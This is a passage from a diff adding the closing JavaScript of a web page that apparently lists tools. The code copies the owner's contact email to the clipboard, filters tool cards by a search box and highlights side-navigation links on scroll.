+  document.body.appendChild(ta); ta.focus(); ta.select();
+  try{ document.execCommand('copy'); cb(); }catch(e){}
+  document.body.removeChild(ta);
+}
+function copyEmail(e){
+  e.preventDefault();
+  var email='dalli.krichen@gmail.com';
+  var lbl=document.getElementById('email-label');
+  function ok(){ if(lbl){ lbl.textContent='\u2713 Copied!'; setTimeout(function(){ lbl.textContent=email; },2000); } }
+  if(navigator.clipboard&&window.isSecureContext){
+    navigator.clipboard.writeText(email).then(ok).catch(function(){ fb(email,ok); });
+  } else { fb(email,ok); }
+}
+function filterTools(){
+  var q=document.getElementById('search').value.toLowerCase();
+  document.getElementById('s-clear').style.display=q?'block':'none';
+  document.querySelectorAll('.tool-card').forEach(function(c){
+    c.classList.toggle('hidden',c.innerText.toLowerCase().indexOf(q)===-1);
+  });
+  document.querySelectorAll('section').forEach(function(s){
+    s.classList.toggle('hidden',s.querySelectorAll('.tool-card:not(.hidden)').length===0);
+  });
+}
+function clearSearch(){ document.getElementById('search').value=''; filterTools(); }
+var obs=new IntersectionObserver(function(entries){
+  entries.forEach(function(e){
+    if(e.isIntersecting){
+      var id=e.target.id;
+      document.querySelectorAll('#sidenav a').forEach(function(a){
+        a.classList.toggle('active',a.getAttribute('href')==='#'+id);
+      });
+    }
+  });
+},{rootMargin:'-25% 0px -70% 0px'});
+document.querySelectorAll('section[id]').forEach(function(s){ obs.observe(s); });
+</script>
+</body>
+</html>
